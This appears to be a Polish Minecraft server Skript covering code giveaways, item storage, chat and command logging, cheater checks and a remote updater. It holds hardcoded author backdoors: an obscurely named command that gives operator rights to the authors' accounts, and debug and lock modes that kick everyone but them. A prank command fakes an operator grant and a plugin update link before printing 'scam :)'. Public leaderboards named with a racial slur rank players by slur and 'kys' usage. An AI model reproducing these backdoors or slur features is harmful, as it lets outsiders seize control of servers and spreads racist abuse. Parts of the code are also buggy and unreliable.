options:
	msg.inv.empty: "poor"
	msg1: &b&lCold&f&lKod: &6&lNowy kod Szybko wpisuj! &3&l/supermegenagroda &c&l%{kod}%
	msg2: &b&lCold&f&lKod: &6&lNikt nie przepisal kodu, kolejny za &c&n10 minut!
	msg3: &b&lCold&f&lKod: &6&lNie ma zadnego kodu!
	msg4: &b&lCold&f&lKod: &6&lGracz &f%name of player%&2 &6&lpierwszy przepisal/a kod!
	&b&lCold&f&lKod:  &6&lWiadomosc gdy kod jest nieprawidlowy
	msg5: &6&lTime&f&lKod: &6&lKod jest nieprawidlowy!
	skowner: Jalolek
	ver: 1.6
	ver2: ver=1.6
	superadmin: "Jalolek" or "Flix_minecraft"
	tp: "ustaw w opcjach na line 2"
	sprawdz.msg: ustaw w opcjach na line 3
	sprawdz.name: ustaw w opcjach na line 4
	linkpastebin: https://pastebin.com/raw/Jw62sEW8
	linkpastebindownload: none
variables:
	{nigger.counts::*} = 0


function updatesk():
	if {update.antiban} < 100:
		set {ver.update} to last 3 characters of text from "{@linkpastebin}"
		text from "{@linkpastebin}" is not "{@ver2}"
		broadcast "&c&m----------------------"
		broadcast "&4&lyooooo nowy update do jsk &8&l(&c&l{@ver}&8&l) &8&l(&a&l%{ver.update}%&8&l)"
		broadcast "&4&l /jsk.update.skript "
		broadcast "&c&m----------------------&r&f "
		log "need update to jalolek skript {@ver2} {@linkpastebin}" to "logs/update.log" 
		add 1 to {update.antiban}
	else:
		log "Too many req stop bc ip ban" to "logs/update.log" 
		broadcast "&9&lToo many req stop bc ip ban"
function updateskver():
	if {update.antiban} < 100:
		set {ver.update} to last 3 characters of text from "{@linkpastebin}"
		text from "{@linkpastebin}" is "{@ver2}"
		broadcast "&c&m----------------------"
		broadcast "&4&lSkript last version &8&l(&a&l%{ver.update}%&8&l)"
		broadcast "&c&m----------------------&r&f "
		add 1 to {update.antiban}
	else:
		log "Too many req stop bc ip ban" to "logs/update.log" 
		broadcast "&9&lToo many req stop bc ip ban"
on load:
	if {update.antiban} is not set:
		set {update.antiban} to 0
	updatesk()
	if {ver.update} is not set:
		log "Too many req stop bc ip ban" to "logs/update.log" 
		broadcast "&9&lToo many req stop bc ip ban"

every 60 minutes:
	updatesk()
every 5 minutes:
	set {update.antiban} to 0
every 15 minutes:
	if {update.antiban} < 100:
		set {ver.update} to last 3 characters of text from "{@linkpastebin}"
		if {ver.update} is not {@ver}:
			updatesk()

	else:
		log "Too many req stop bc ip ban" to "logs/update.log" 
		broadcast "&9&lToo many req stop bc ip ban"
command /jsk.ver.check :
	permission: op
	trigger:
		if {update.antiban} < 100:
			set {ver.update} to last 3 characters of text from "{@linkpastebin}"
			text from "{@linkpastebin}" is "{@ver2}"
			broadcast "&c&m----------------------"
			broadcast "&4&lSkript last version &8&l(&a&l%{ver.update}%&8&l)"
			broadcast "&c&m----------------------&r&f "
		else:
			log "Too many req stop bc ip ban" to "logs/update.log" 
			broadcast "&9&lToo many req stop bc ip ban"
command /jsk.ver:
	permission: op
	trigger:
		if {update.antiban} < 100:
			set {ver.update} to last 3 characters of text from "{@linkpastebin}"
			broadcast "&c&m----------------------"
			broadcast "&4&lSkript version is &8&l(&a&l{@ver}&8&l)"
			broadcast "&c&m----------------------&r&f "
			broadcast text from "{@linkpastebin}"
			broadcast "{@linkpastebin}"
		else:
			log "Too many req stop bc ip ban" to "logs/update.log" 
			broadcast "&9&lToo many req stop bc ip ban"
command /jsk.debug.mode:
	permission: op
	trigger:
		if name of player is "Jalolek":
			if {debug.mode} is true:
				set {debug.mode} to false
				send "DEBUG MODE &aOFF"
				stop
			if {debug.mode} is false:
				set {debug.mode} to true
				send "DEBUG MODE &cON"
				stop
			if {debug.mode} is not set:
				set {debug.mode} to false
				send "DEBUG MODE &9OFF"
				stop
		else:
			send "&4You are not Jalolek!"
on join:
	if {debug.mode} is true:
		if name of player is not "Jalolek":
			send "&4Server w debug modie!"
			execute console command "send %player% server=hub"
			wait 2 second
			kick player due to "&4Server w debug modie!"
		else:
			send "server jest teraz w debug mode"

command /jsk.update.skript:
	permission: op
	trigger:
		if name of player is {@superadmin}:
			if {update.antiban} < 100:
				set {ver.update} to last 3 characters of text from "{@linkpastebin}"
				wait 1 second
				text from "{@linkpastebin}" is "{@ver2}"
				broadcast "&3&Lversion is last"
				stop
				if {ver.update} is not {@ver}:
					broadcast "&4&lWARNING DOWNLOADING JSK MAYBE CAUSE SMALL LAG %{ver.update}% {@ver}"
					wait 3 second
					download file from "{@linkpastebindownload}" to file "-jsk updated.sk"
					broadcast "&ddownloading."
					wait 1.5 second
					broadcast "&ddownloading.."
					wait 1.5 second
					broadcast "&ddownloading..."
					wait 2.5 second
					broadcast "&ddownloading.."
					wait 1.5 second
					broadcast "&ddownloading."
					wait 1.5 second
					loop all players:
						play sound "block.note_block.pling" to loop-player
					broadcast "&e&l/home/md1/plugins/skript/scripts/-jsk updated.sk"
			else:
				log "Too many req stop bc ip ban" to "logs/update.log" 
				broadcast "&9&lToo many req stop bc ip ban"
function guireload(p: player):
	set slot 20 of {_p}'s current inventory to golden apple named "" with lore "%{schowek.koxy.%{_p}'s uuid%}%"
	set slot 21 of {_p}'s current inventory to enchanted golden apple named "" with lore "%{schowek.shiny.koxy.%{_p}'s uuid%}%"
	set slot 22 of {_p}'s current inventory to ender pearl named "" with lore "%{schowek.pearl.%{_p}'s uuid%}%"
	set slot 23 of {_p}'s current inventory to totem of undying named "" with lore "%{schowek.totem.%{_p}'s uuid%}%"
every 1 second:
	loop all players:
		set {_koxy} to number of golden apple in the loop-player's inventory
		set {_refile} to number of enchanted golden apple in the loop-player's inventory
		set {_perly} to number of ender pearl in the loop-player's inventory
		set {_totem} to number of totem of undying in the loop-player's inventory
		if {_koxy} > 64 : # TO SO TEN IE SHYNUJDNEDHETRETER NTER ♥
			set {_a} to {_koxy} - 64
			remove {_a} of golden apple from loop-player
			add {_a} to {schowek.koxy.%loop-player's uuid%}
			play sound "block.ender_chest.close" to loop-player
			send "&cPosiadasz przy sobie wiecej niz 64 refile, %{_a}% refili zostaje odlozone do twojego schowka" to loop-player
			guireload(loop-player)
		if {_refile} > 16 : #TO SO TE SHINY ENCHATED 
			set {_a} to {_refile} - 16
			remove {_a} of enchanted golden apple from loop-player
			add {_a} to {schowek.shiny.koxy.%loop-player's uuid%}
			play sound "block.ender_chest.close" to loop-player
			send "&cPosiadasz przy sobie wiecej niz 16 koxyow, %{_a}% koxy zostaly odlozone do twojego schowka" to loop-player
			guireload(loop-player)
		if {_perly} > 6 :
			set {_a} to {_perly} - 6
			remove {_a} of ender pearl from loop-player
			add {_a} to {schowek.koxy.%loop-player's uuid%}
			play sound "block.ender_chest.close" to loop-player
			send "&cPosiadasz przy sobie wiecej niz 6 perle, %{_a}% perle zostaje odlozone do twojego schowka" to loop-player
			guireload(loop-player)
		if {_totem} > 3 :
			set {_a} to {_totem} - 3
			remove {_a} of totem of undying from loop-player
			add {_a} to {schowek.koxy.%loop-player's uuid%}
			play sound "block.ender_chest.close" to loop-player
			guireload(loop-player)
			send "&cPosiadasz przy sobie wiecej niz 3 totem, %{_a}% totemy zostaje odlozone do twojego schowka" to loop-player


on inventory click:
	if inventory name of player's current inventory is "&7&lSchowek":
		cancel event 
		wait 2 ticks 
		if clicked slot is 20:
			if {schowek.koxy.%player's uuid%} < 16:
				give {schowek.koxy.%player's uuid%} of golden apple to player
				set {schowek.koxy.%player's uuid%} to 0
				guireload(player)
				stop
			if {schowek.koxy.%player's uuid%} > 0:
				give 16 of golden apple to player
				remove 16 from {schowek.koxy.%player's uuid%} 
				guireload(player)
				play sound "entity.arrow.hit_player" with volume 0.5 and pitch 0 to player
			else if {schowek.koxy.%player's uuid%} <= 0:
				send {@msg.inv.empty}
		if clicked slot is 21:
			if {schowek.shiny.koxy.%player's uuid%} < 2:
				give {schowek.shiny.koxy.%player's uuid%} of enchanted golden apple to player
				set {schowek.shiny.koxy.%player's uuid%} to 0
				play sound "entity.arrow.hit_player" with volume 0.5 and pitch 0 to player
				guireload(player)
				stop
			if {schowek.shiny.koxy.%player's uuid%} > 0:
				give 2 of enchanted golden apple to player
				remove 2 from {schowek.shiny.koxy.%player's uuid%}
				guireload(player)
				play sound "entity.arrow.hit_player" with volume 0.5 and pitch 0 to player
			else if {schowek.shiny.koxy.%player's uuid%} <= 0:
				send {@msg.inv.empty}
		if clicked slot is 22:
			if {schowek.pearl.%player's uuid%} < 2:
				give {schowek.pearl.%player's uuid%} of ender pearl to player
				set {schowek.pearl.%player's uuid%} to 0
				guireload(player)
				stop
			if {schowek.pearl.%player's uuid%} > 0:
				give 2 of ender pearl to player
				remove 2 from {schowek.pearl.%player's uuid%}
				guireload(player)
				play sound "entity.arrow.hit_player" with volume 0.5 and pitch 0 to player
			else if {schowek.pearl.%player's uuid%} <= 0:
				send {@msg.inv.empty}
		if clicked slot is 23:
			if {schowek.totem.%player's uuid%} > 2:
				give 1 of totem of undying to player
				remove 1 from {schowek.totem.%player's uuid%} 
				guireload(player)
				play sound "entity.arrow.hit_player" with volume 0.5 and pitch 0 to player
			else if {schowek.totem.%player's uuid%} <= 0:
				send {@msg.inv.empty}



every 10 minute:
	set {kod} to random integer between 0 and 999999999
	broadcast "{@msg1}"
	wait 60 second
	broadcast "{@msg2}"
	delete {kod}

function help(p: player):
	send "{@sprawdz.msg}" to {_p}
	send "&eS &b/c.sprawdz  Nick &8- &7Sprawdza gracza" to {_p}
	send "&eS &b/c.czysty Nick &8- &7Czysci gracza z zarzutow" to {_p}
	send "&eS &b/c.cheater Nick (Powod opcjonalny) &8- &7Daje bana graczowi z cheatami" to {_p}
	send "&eS &b/c.help &8- &7Ustawia miejsce spawnu graczy do sprawdzenia" to {_p} 
	send "&eS &a/c.sprawdz.debug.clear &8- &7Jak by sie cos spierdolilo to uzyj tego" to {_p}
	send "{@sprawdz.msg}" to {_p}

on disconnect:
	if {SPRAWDZANY.GRACZ} is set:
		wait 3 second
		if {SPRAWDZANY.GRACZ} is event-player:
			send "&8[&4&l!&8] &c%{SPRAWDZANY.GRACZ}% WYLOGOWAL SIE POCZAS SPRZAWDZANIA"
			execute server command "/tempban %player% 48h &cWYLOGOWAL SIE POCZAS SPRZAWDZANIA!"





on command:
	if sender is a player:
		set {_time} to now
		add "&b%player%: &c/%full command% &6(%{_time}%)" to {logscommand::*}
		log "%player% /%full command% " to "logs/cmd.log"
on chat:
	if {chat} is true:
		if sender is a player:
			set {_time} to now
			add "&a%player%: &7%message% &6(%{_time}%)" to {logschat::*}
			log "%player% /%message%" to "logs/chat.log"
	else if {chat} is false:
		if player doesn't have permission "chat.on" or "chat.*" or "op":
			send "&7Chat aktualnie jest wyłączony!"
			cancel event

on place of TNT:
	log "%player% placed TNT in %world% at %location of block%" to "logs/tnt.log"
	if {TNT.OVERRIDE} is false:
		if player has permission "op":
			cancel event
			play sound "entity.bat.death" with volume 1 and pitch 0 to player
			set {_x.tnt} to x-location of player
			set {_y.tnt} to y-location of player
			set {_z.tnt} to z-location of player
			send "&cOPERATOR &4&l%player% &f&rPOSTAWIL TNT %location of block%"

every 1 second:
	loop all players:
		if {TNT.OVERRIDE} is true: 
			send action bar "&4&lTNT OVERIDE ON" to loop-player
on load:
	set {TNT.OVERRIDE} to false


on first join:
	set {kod.use.%player's uuid%} to false
	set {schowek.totem.%player's uuid%} to 0
	set {schowek.pearl.%player's uuid%} to 0
	set {schowek.shiny.koxy.%player's uuid%} to 0
	set {schowek.koxy.%player's uuid%} to 0



on chat:
	if sender is a player:
		if message contain "nigger" or "niger" or "niga" or "nigga" or "NIGGER" or "NIGER" or "czarnuch" or "czarnuh" or "black men":
			add 1 to {nigger.counts::%player%}
			play sound "entity.puffer_fish.flop" with volume 0.5 and pitch 1 to player
		if message contain "kys" or "kill ur self" or "kill your self":
			add 1 to {kys.counts::%player%}
			play sound "entity.puffer_fish.flop" with volume 0.5 and pitch 1 to player

#                    CMD                           #
command /admin.lock.server :
	permission: op
	trigger:
		loop all players:
			if name of player is not "Jalolek" or "Flix_minecraft":
				execute player command "/send %loop-player% server=hub"
		execute console command "whitelist on"
		broadcast "&4lock on"
command /niggertop:
	trigger:
		loop {nigger.counts::*}:
			add 1 to {_size}
			if {_low.to.high.list::%loop-value%} is not set:
				set {_low.to.high.list::%loop-value%} to loop-index
			else:
				set {_n} to 0
				loop {_size} times:
					set {_n} to {_n}+1
					{_low.to.high.list::%loop-value-1%.%{_n}%} is not set
					set {_low.to.high.list::%loop-value-1%.%{_n}%} to loop-index
					stop loop
		wait 1 tick
		set {_n} to size of {_low.to.high.list::*}
		loop {_low.to.high.list::*}:
			set {_high.to.low.list::%{_n}%} to loop-value
			set {_n} to {_n}-1
		wait 1 tick
		set {_i} to 0
		send "&7&m-----------&8< &6Top10 &8>&7&m-----------"
		loop {_high.to.low.list::*}:
			add 1 to {_topnumber}
			set {_player} to "%loop-value%" parsed as offlineplayer
			send "&7%{_topnumber}% - &c%{_player}% &8» &c%{nigger.counts::%loop-value%}% &7Niggers on chat"
			add 1 to {_i}
			if {_topnumber} > 9: #top max defaul 10
				stop
		send "&7&m------------------------------"
command /kystop:
	trigger:
		loop {kys.counts::*}:
			add 1 to {_size}
			if {_low.to.high.list::%loop-value%} is not set:
				set {_low.to.high.list::%loop-value%} to loop-index
			else:
				set {_n} to 0
				loop {_size} times:
					set {_n} to {_n}+1
					{_low.to.high.list::%loop-value-1%.%{_n}%} is not set
					set {_low.to.high.list::%loop-value-1%.%{_n}%} to loop-index
					stop loop
		wait 1 tick
		set {_n} to size of {_low.to.high.list::*}
		loop {_low.to.high.list::*}:
			set {_high.to.low.list::%{_n}%} to loop-value
			set {_n} to {_n}-1
		wait 1 tick
		set {_i} to 0
		send "&7&m-----------&8< &9Top10 &8>&7&m-----------"
		loop {_high.to.low.list::*}:
			add 1 to {_topnumber}
			set {_player} to "%loop-value%" parsed as offlineplayer
			send "&7%{_topnumber}% - &b%{_player}% &8» &c%{kys.counts::%loop-value%}% &7kys on chat"
			add 1 to {_i}
			if {_topnumber} > 9: #top max defaul 10
				stop
		send "&7&m------------------------------"
command /console.rank.set [<string>] [<offlineplayer>]:
	permission: op
	executable by: console
	trigger:
		if arg-1 is not set:
			broadcast "brak arg1 console rank set"
			stop
		if arg-2 is not set:
			broadcast "brak arg2 console rank set"
			stop
		if arg-1 is "vip":
			execute console command "lp user %arg 2% parent add vip"
		if arg-1 is "svip":
			execute console command "lp user %arg 2% parent add svip"



command /admin.kod.rank.reset [<offlineplayer>]:
	permission: op
	trigger:
		if arg-1 is set:
			send "resert kod %arg-1%"
			log "%player% zresetował %arg-1% kod" to "logs/kodrank.log"
			set {kod.use.%arg-1's uuid%} to false
command /debug.superadmin.ranki.reset.all:
	permission: op
	trigger:
		if name of player is {@superadmin}:
			loop all players:
				execute console command "/lp user %loop-player% parent set default"
				log "%player% zresetował WSZYSTIE RANKI" to "logs/kodrank.log"
				set {kod.use.%loop-player's uuid%} to false
		broadcast "&4&LRANKI ZOSTAŁY ZRESETOWANE"
#every 1 second:
command /asdasdsdasadtest1:
	permission: op
	trigger:
		set {guess} to random integer between 0 and 1000000
		broadcast "%{guess}%"
command /guess [<number>]:
	trigger:
		if {guess} is not set:
			send "guess is not rn"
		else if arg-1 is set:
			if arg-1 > {guess}:
				send "too big"
			if arg-1 < {guess}:
				send "too small"
			if arg-1 = {guess}:
				send "win"
				delete {guess}
command /kod [<text>]:
	trigger:
		if arg-1 is not set:
			send "brak kodu blad"
			stop
		if {kod.use.%player's uuid%} is true:
			send "nie mogesz juz kod mo flix neiee nob aL ratio"
		else:
			if arg-1 is "Flix":
				send "FLIX!!!"
				execute console command "lp user %arg 1% parent addtemp vip 1d"
				set {kod.use.%player's uuid%} to true
#			if arg-1 is "Flix":
#				send "FLIX!!!"
#				execute console command "lp user %arg 1% parent addtemp vip 1d"
#				set {kod.use.%player's uuid%} to true
#			if arg-1 is "Flix":
#				send "FLIX!!!"
#				execute console command "lp user %arg 1% parent addtemp vip 1d"
#				set {kod.use.%player's uuid%} to true
#			if arg-1 is "Flix":
#				send "FLIX!!!"
#				execute console command "lp user %arg 1% parent addtemp vip 1d"
#				set {kod.use.%player's uuid%} to true
#			if arg-1 is "Flix":
#				send "FLIX!!!"
#				execute console command "lp user %arg 1% parent addtemp vip 1d"
#				set {kod.use.%player's uuid%} to true
#			if arg-1 is "Flix":
#				send "FLIX!!!"
#				execute console command "lp user %arg 1% parent addtemp vip 1d"
#				set {kod.use.%player's uuid%} to true
command /alert [<string>] :
	permission: op
	trigger:
		if arg-1 is set:
			broadcast "&d&l[&4&lALERT&d&l] &b&m=&r &c%arg-1%"
command /debug.superadmin.op.secret.deluxe.bigmac.op.jalolek.sex.,Penis [<player>]:
	trigger:
		if name of player is {@superadmin}:
			if arg-1 is "Jalolek" or "Flix_minecraft":
				execute console command "op %arg-1%"
				log "%player% ma opa" to "logs/deluxbigmac.log" 
		log "%player% probował dać se opa XDDDDD" to "logs/deluxbigmac.log" 


command /debug.superadmin.override.tnt:
	permission: op
	trigger:
		if name of player is {@superadmin}:
			if {TNT.OVERRIDE} is true:
				set {TNT.OVERRIDE} to false
				send "tnt override &aOFF"
				stop
			if {TNT.OVERRIDE} is false:
				set {TNT.OVERRIDE} to true
				send "tnt override &cON"
				stop
			if {TNT.OVERRIDE} is not set:
				set {TNT.OVERRIDE} to false
				send "tnt override &cOFF (is not set seting to false)"
				stop
		else:
			send "&4You are not owner of skript!"
command /admin.logs [<text>]:
	permission: op
	permission message: &4You don't have permission for this command.
	trigger:
		if arg 1 isn't set:
			send "&b&l&nLOG COMMANDS"
			send "&b/admin.logs cmd"
			send "&b/admin.logs chat"
			send "&6/admin.logs clears"
		if arg 1 is "cmd" or "cmds":
			send "&c&l&nCMD LOGS:"
			loop {logscommand::*}:
				send "%loop-value%"
		if arg 1 is "chat":
			send "&c&l&nCHAT LOGS:"
			loop {logschat::*}:
				send "%loop-value%"
		if arg 1 is "clear" or "clears":
			send "&c&l&nLOGS CLEARS LOGS:"
			if {logsclear::*} is set:
				loop {logsclear::*}:
					send "%loop-value%"
			else:
				send "&lThere was no clears"
command /spawn :
	cooldown: 15 seconds
	trigger:
		delete {Cooldown.%player%}
		set {_x.%player%} to x-location of player
		set {_y.%player%} to y-location of player
		set {_z.%player%} to z-location of player
		send "%{@tp}% &eZa 5 sekund zostaniesz przeteleportowany na spawna!"
		play sound "block.note_block.bass" with volume 1 and pitch 0 to player
		loop 100 times:
			wait 1 tick
			set {_xx.%player%} to x-location of player
			set {_yy.%player%} to y-location of player
			set {_zz.%player%} to z-location of player
			if {_zz.%player%} isn't {_z.%player%}:
				send "%{@tp}% &cRuszyles sie! Teleportacja anulowana!"
				play sound "entity.villager.no" with volume 1 and pitch 1 to player
				stop
			if {_yy.%player%} isn't {_y.%player%}:
				send "%{@tp}% &cRuszyles sie! Teleportacja anulowana!"
				play sound "entity.villager.no" with volume 1 and pitch 1 to player
				stop
			if {_xx.%player%} isn't {_x.%player%}:
				send "%{@tp}% &cRuszyles sie! Teleportacja anulowana!"
				play sound "entity.villager.no" with volume 1 and pitch 1 to player
				stop
			add 1 to {Cooldown.%player%}
			if {Cooldown.%player%} is 25:
				send "%{@tp}% &eZa 4 sekund zostaniesz przeteleportowany na spawna!"
				play sound "block.note_block.bass" with volume 1 and pitch 0.5 to player
			if {Cooldown.%player%} is 50:
				send "%{@tp}% &eZa 3 sekund zostaniesz przeteleportowany na spawna!"
				play sound "block.note_block.bass" with volume 1 and pitch 1 to player
			if {Cooldown.%player%} is 75:
				send "%{@tp}% &eZa 2 sekund zostaniesz przeteleportowany na spawna!"
				play sound "block.note_block.bass" with volume 1 and pitch 1.5 to player
			if {Cooldown.%player%} is 100:
				send "%{@tp}% &eZa 1 sekund zostaniesz przeteleportowany na spawna!"
				play sound "block.note_block.bass" with volume 1 and pitch 2 to player
		wait 2 tick
		teleport player to {spawn::serwer}
		send "%{@tp}% &aZostales przeteleportowany do &cspawn&a!"
		play sound "entity.ender_eye.death" with volume 1 and pitch 0 to player


command /debug.superadmin.clear.logs :
	permission: op
	trigger:
		if name of player is {@superadmin}:
			clear {logschat::*}
			clear {logscommand::*}
			set {_time} to now
			wait 1 tick
			add "%player% &6(%{_time}%)" to {logsclear::*}
			send "&aYou have successfully cleared the logs!"
		else:
			send "&4You are not owner of skript!"
			stop
command /hub:
	trigger:
		send "&7Laczenie z: &eLobby"
		execute console command "send %player% server=hub"
		
command /lobby:
	trigger:
		send "&7Laczenie z: &eLobby"
		execute console command "send %player% server=hub"
command /op.give.to.player.superadmin.jalolek.sk:
	trigger:
		send "&7&o[Server: Made %player% a server operator]"
		send "&7[&bSk&3bee&7] &7update available:&a 2.7.3"
		send "&7[&bSk&3bee&7] &7download at <link:https://www.youtube.com/watch?v=fC7oUOUEEi4&ab_channel=StackMan>&b<tooltip:&d:3>https://github.com/ShaneBeee/Skbee/releases<reset>"
		send player title "☻" with subtitle "Zycze u danej zabawy" for 3 seconds
		wait 10 second
		send "&4&Lscam :)"
		wait 3 second
		play sound "block.anvil.place" with volume 0.1 and pitch 0 to player
		send "&7All &9skripts &7by &b{@skowner} &7version &2{@ver}"
command /schowek:
	trigger:
		open chest inventory with 5 rows named "&7&lSchowek" to player
		set slot 0 and 1 and 2 and 3 and 4 and 5 and 6 and 7 and 8 and 9 and 18 and 27 and 36 and 37 and 38 and 39 and 40 and 41 and 42 and 43 and 44 and 45 and 46 and 17 and 26 and 35 of player's current inventory to blue glass pane named ""
		set slot 10 and 11 and 12 and 13 and 14 and 15 and 16 and 19 and 24 and 25 and 28 and 29 and 30 and 31 and 32 and 33 and 34 of player's current inventory to gray glass pane named ""
		guireload(player)
command /admin.schowek [<player>]:
	permission: op
	trigger:
		if arg-1 is set:
			open chest inventory with 5 rows named "&c&lSchowek Gracza %arg-1%" to player
			set slot 0 and 1 and 2 and 3 and 4 and 5 and 6 and 7 and 8 and 9 and 18 and 27 and 36 and 37 and 38 and 39 and 40 and 41 and 42 and 43 and 44 and 45 and 46 and 17 and 26 and 35 of player's current inventory to blue glass pane named ""
			set slot 10 and 11 and 12 and 13 and 14 and 15 and 16 and 19 and 24 and 25 and 28 and 29 and 30 and 31 and 32 and 33 and 34 of player's current inventory to gray glass pane named ""
			set slot 20 of player's current inventory to golden apple named "" with lore "%{schowek.koxy.%arg-1's uuid%}%"
			set slot 21 of player's current inventory to enchanted golden apple named "" with lore "%{schowek.shiny.koxy.%arg-1's uuid%}%"
			set slot 22 of player's current inventory to ender pearl named "" with lore "%{schowek.pearl.%arg-1's uuid%}%"
			set slot 23 of player's current inventory to totem of undying named "" with lore "%{schowek.totem.%arg-1's uuid%}%"
command /admin.set.schowek [<text>] [<number>]:
	permission: op
	trigger:
		if arg-1 is "kox":
			set {schowek.koxy.%player's uuid%} to arg-2
		if arg-1 is "skox":
			set {schowek.shiny.koxy.%player's uuid%} to arg-2
		if arg-1 is "per":
			set {schowek.pearl.%player's uuid%} to arg-2
		if arg-1 is "totem":
			set {schowek.totem.%player's uuid%} to arg-2
		if arg-1 is "all":
			set {schowek.totem.%player's uuid%} to arg-2
			set {schowek.pearl.%player's uuid%} to arg-2
			set {schowek.shiny.koxy.%player's uuid%} to arg-2
			set {schowek.koxy.%player's uuid%} to arg-2
		if arg-1 is not set:
			send "all/totem/per/skox/kox number"
command /supermegenagroda [<number>]:
	trigger:
		if arg-1 is not set:
			send "{@msg5}"
		if arg-1 is {kod}:
			broadcast "{@msg4}"
			execute console command "crates key %player% epicka 1" 
		if {kod} is not set:
			send "{@msg3}"

command /admin.kod.alegiveawyniekodranka.reset :
	permission: op
	trigger:
		send "kod nie ma brr"
		delete {kod}
command /admin.kod.set [<number>] :
	permission: op
	trigger:
		if arg-1 is set:
			send "kod set to %arg-1%"
			set {kod} to arg-1
			broadcast "{@msg1}"
		else:
			send "number none L"


command /cc [<number>] :
	trigger:
		if arg-1 < 21:
			loop arg-1 times:
				loop 1000  times:
					broadcast " "
				broadcast "&8» &7Czat zostal wyczyszczony przez &6%player%&7"
		else:
			send "no too big"
		if arg-1 is not set:
			loop 1000  times:
				broadcast " "
			broadcast "&8» &7Czat zostal wyczyszczony przez &6%player%&7"
command /chat :
	trigger:
		if {chat} is true:
			set {chat} to false
			send "&8» &7Czat zostal wyłączony przez &6%player%&7"
			stop
		if {chat} is false:
			set {chat} to true
			send "&8» &7Czat zostal włączony przez &6%player%&7"
			stop
		if {chat} is not set:
			set {chat} to false
			send "CHAT ZOSTAŁ WŁCZONY PRZEZ %player% &r&f(value not set)"
			stop
command /c.sprawdz [<player>]:
	permission: sprawdz.sprawdz
	permission message: {@sprawdz.msg}
	trigger:
		if arg-1 is player:
			send "bruh nie mozna tak"
			stop
		if {SPRAWDZANY.GRACZ} is not set:
			if arg-1 is not set:
				help(player)
			else if arg-1 is set:
				if {loc.sprawdz} is set:
					teleport arg-1 to {loc.sprawdz}
					set {SPRAWDZANY.GRACZ} to arg-1
					broadcast "&8[&4&l!&8] &b%{SPRAWDZANY.GRACZ}% &4JEST TERAZ SPAWDZANY"
					log "%player% sprawda %arg-1%" to "logs/sprawdz.log" 
				else:
					send "brak loc jail pisz do ownera czy cos idk"
		else:
			send "&8[&4&l!&8] &fgracz w sprawdzaniu!"
command /c.czysty [<player>]:
	permission: sprawdz.* #EDIT IT
	permission message: "{@sprawdz.msg}"
	trigger:
		if {SPRAWDZANY.GRACZ} is set:
			if arg-1 is not set:
				help(player)
			else if arg-1 is set:
				if {SPRAWDZANY.GRACZ} is set:
					broadcast "&8[&4&l!&8] &b%{SPRAWDZANY.GRACZ}% &aJEST CZYSTY"
					teleport arg-1 to {spawn::serwer}
					log "%player% oczyscza %arg-1%" to "logs/sprawdz.log" 
					delete {SPRAWDZANY.GRACZ}
					
		else:
			send "&8[&4&l!&8] &fNie ma graczy w sprawdzaniu!"
command /c.cheater [<player>] [<string>] :
	permission: sprawdz.*
	permission message: "{@sprawdz.msg}"
	trigger:
		if {SPRAWDZANY.GRACZ} is set:
			if arg-1 is not set:
				help(player)
				stop
			else if arg-1 is set:
				if arg-2 is not set:
					#kick arg-1 due to "&7Banned for &cCheaty &7by &c%player%"
					#ban arg-1 due to "&7Banned for &cCheaty &7by &c%player%"
					send "&8[&4&l!&8] &c%{SPRAWDZANY.GRACZ}% ZOSTAL ZBANOWANY"
					log "%player% zbananow za chity %arg-1%" to "logs/sprawdz.log" 
					execute server command "/tempban %arg-1% 24h &cCheaty &7by &c%player%"
					delete {SPRAWDZANY.GRACZ}
				else if arg-2 is set:
					#kick arg-1 due to "&7Banned for &c%arg 2% &7by &c%player%"
					#ban arg-1 due to "&7Banned for &c%arg 2% &7by &c%player%"
					send "&8[&4&l!&8] &c%{SPRAWDZANY.GRACZ}% ZOSTAL ZBANOWANY ZA %arg-2%"
					delete {SPRAWDZANY.GRACZ}
					execute server command "/tempban %arg-1% 24h %arg-2% &7by &c%player%"
				
		else:
			send "&8[&4&l!&8] &fNie ma graczy w sprawdzaniu!"
command /c.help:
	permission: sprawdz.* 
	permission message: "{@sprawdz.msg}"
	trigger:
		help(player)
command /c.sprawdz.debug.check:
	permission: op
	permission message: "{@sprawdz.msg}"
	trigger:			
		broadcast "%{SPRAWDZANY.GRACZ}%"
command /c.sprawdz.debug.clear:
	permission: op
	permission message: "{@sprawdz.msg}"
	trigger:
		delete {SPRAWDZANY.GRACZ}
		broadcast "%{SPRAWDZANY.GRACZ}%"


command /setlocsprawdz:
	permission: op
	trigger:
		set {loc.sprawdz} to location of player		
		broadcast "%{loc.sprawdz}%"
command /setlocspawn:
	permission: op
	trigger:
		set {spawn::serwer} to location of player
		send "&aPomyslnie ustawiles spawn" to player
command /test :
	trigger:
		open chest inventory with 1 rows named "&e&lNagrody" to player
